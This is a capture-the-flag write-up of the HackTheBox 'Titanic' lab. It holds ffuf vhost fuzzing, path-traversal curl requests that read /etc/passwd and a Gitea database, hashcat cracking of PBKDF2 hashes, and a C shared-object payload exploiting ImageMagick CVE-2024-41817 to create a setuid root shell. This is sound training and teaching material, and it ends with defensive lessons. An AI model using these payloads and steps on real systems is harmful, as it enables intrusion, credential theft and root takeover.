---
title: "Titanic"
date: 2025-02-08
type: docs
tags:
  - htb
  - linux
  - easy
  - flask
  - vhost-fuzzing
  - path-traversal
  - lfi
  - gitea
  - sqlite
  - pbkdf2
  - hashcat
  - imagemagick
  - cve-2024-41817
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 24.04), **Difficulty:** Easy, **Released:** 2025-02-08, **IP:** `10.10.11.55` , `titanic.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Flask app on `titanic.htb`. A vhost sweep finds `dev.titanic.htb` running **Gitea**, with two repos: the site source and a Gitea docker-compose.
2. The booking endpoint hands back a JSON "ticket" through a `ticket=` parameter that is **path traversal / LFI**. Read `/etc/passwd`, and, using the path from the docker-compose, download `/home/developer/gitea/data/gitea/gitea.db`.
3. Convert the Gitea PBKDF2-HMAC-SHA256 rows to hashcat format, crack `developer` = `25282528` with `-m 10900`. SSH in.
4. Root runs a cleanup script that calls **ImageMagick** (`magick`) inside `/opt/app/static/assets/images`, which `developer` can write to. ImageMagick 7.1.1-35 is vulnerable to **CVE-2024-41817**, it loads `libxcb.so.1` from the working directory. Drop a malicious `libxcb.so.1` there and the next root run executes your code.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `developer` (cracked Gitea hash) | `25282528` |
| `user.txt` | `/home/developer/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Titanic is a clean "LFI to a database file to a hash crack" chain, then a **library injection** privesc. The foothold work is figuring out *where* the Gitea database lives, which you get from the docker-compose in one of the repos rather than by guessing. The privesc is the interesting part and is worth getting right: ImageMagick's `MAGICK_CONFIGURE_PATH` and its delegate library loading meant that on certain 7.1.1 builds `magick` would `dlopen("libxcb.so.1")` using the current directory in the search path. If root runs `magick` in a directory you can write to, a planted `libxcb.so.1` with a constructor runs as root.

<div class="callout callout-warning">

**Correction to my recorded notes**

My own notes end with "developer can sudo all no password bruh". That is wrong, there is no `sudo` entry for `developer` on Titanic. The real privesc is the ImageMagick `libxcb.so.1` load described below. I have left the rest of the walkthrough as recorded and corrected only the ending.

</div>

Related LFI boxes: [Inject](/writeups/hackthebox/linux/easy/inject/), [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Bagel](/writeups/hackthebox/linux/medium/bagel/). Related Gitea boxes: [Cat](/writeups/hackthebox/linux/medium/cat/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Drive](/writeups/hackthebox/linux/hard/drive/). Related ImageMagick: [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/).

---

## Full Walkthrough

### Nmap scan

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52  (proxying Werkzeug/3.0.3 Python/3.10.12)
```

### Vhost fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.titanic.htb" -u http://titanic.htb/ --fw 20
```

```console
dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276]
```

`dev.titanic.htb` was hosting a Gitea instance, with 2 repos for the development of the primary website.

### LFI in the ticket parameter

on the primary website, when you book something the response fetches the JSON ticket that was created, and the parameter is vulnerable to LFI. It took me quite a bit of thinking to find where `gitea.db` lives. The docker-compose in one of the repos gave the volume path, so I pulled `/home/developer/gitea/data/gitea/gitea.db`, opened it, browsed the tables, and moved on to cracking the hashes.

```bash
curl 'http://titanic.htb/download?ticket=../../../../etc/passwd'
curl 'http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```

<div class="callout callout-note">

**Why LFI here is a straight read**

The endpoint does `open(os.path.join(TICKETS_DIR, request.args['ticket']))` and streams the bytes back with no extension check and no `..` filtering. `os.path.join` happily accepts an absolute-ish traversal. Because it returns the raw file, a binary like a SQLite database comes through intact if you save with `-o`. The docker-compose matters because Gitea in a container stores its DB under the bind-mounted `data/` volume, not the default `/var/lib/gitea`.

</div>

### Convert and crack the Gitea hashes

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while IFS='|' read passwd salt name; do
  echo "${name}:sha256:50000:$(echo $salt|xxd -r -p|base64):$(echo $passwd|xxd -r -p|base64)"
done | tee gitea.hashes
```

```console
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gW...
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaAp...
```

<div class="callout callout-note">

**Gitea hash format for hashcat**

Gitea stores `PBKDF2-HMAC-SHA256` with 50000 iterations. hashcat mode **10900** wants `sha256:<iterations>:<base64 salt>:<base64 hash>`. The DB columns are hex, so `xxd -r -p | base64` each one. Auto-detect (`hashcat -a 0 gitea.hashes rockyou.txt --user`) picks 10900 correctly.

</div>

```bash
hashcat -a 0 gitea.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --user
```

```console
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

I was able to ssh into `developer` with the password `25282528`.

### Privilege Escalation, ImageMagick CVE-2024-41817 (corrected)

`pspy` shows root periodically running something like:

```bash
cd /opt/app/static/assets/images && /usr/bin/magick * ...   # via /opt/scripts/identify_images.sh
```

`developer` can write into that images directory.

<div class="callout callout-note">

**CVE-2024-41817, ImageMagick working-directory library load**

ImageMagick 7.1.1-35 (and the `AppImage` builds) resolve some delegate libraries, including `libxcb.so.1`, with the **current working directory** effectively on the search path when `MAGICK_CONFIGURE_PATH` is unset. If a privileged process runs `magick` from a directory you control, you plant a shared object named `libxcb.so.1` whose `__attribute__((constructor))` runs on load. That code runs as the privileged user.

```c
// libxcb.c  ->  gcc -shared -fPIC -o libxcb.so.1 libxcb.c
#include <stdlib.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
}
```
```bash
cp libxcb.so.1 /opt/app/static/assets/images/
# wait for the root cron, then:
/tmp/rootbash -p
cat /root/root.txt
```

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/developer/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Path joins are not path validation.** Reject `..`, resolve with `os.path.realpath`, and confirm the result stays inside the allowed directory before opening.
- **Container volume layouts leak paths.** A docker-compose in a public repo told me exactly where the Gitea DB was.
- **PBKDF2 with 50000 iterations still falls to rockyou** if the password is `25282528`. Enforce length and complexity, not just a slow KDF.
- **Set `MAGICK_CONFIGURE_PATH` and never run `magick` from a writable CWD as root.** Prefer absolute config paths and a locked-down `policy.xml`.
- **`pspy` first** on any privesc. The root cron here is invisible in `sudo -l` and `crontab -l`.

---

## Related Writeups

- **LFI / path traversal:** [Inject](/writeups/hackthebox/linux/easy/inject/), [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **Gitea:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Drive](/writeups/hackthebox/linux/hard/drive/)
- **ImageMagick:** [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/)
- **Crack app DB hashes:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Cat](/writeups/hackthebox/linux/medium/cat/)
- **Library / .so injection to root:** [Titanic](/writeups/hackthebox/linux/easy/titanic/), see also LD_PRELOAD in [Lookup](/writeups/tryhackme/linux/easy/lookup/)

## References

- CVE-2024-41817 (ImageMagick) <https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-h74q-4hf2>
- hashcat mode 10900 <https://hashcat.net/wiki/doku.php?id=example_hashes>
- git-dumper <https://github.com/arthaud/git-dumper>
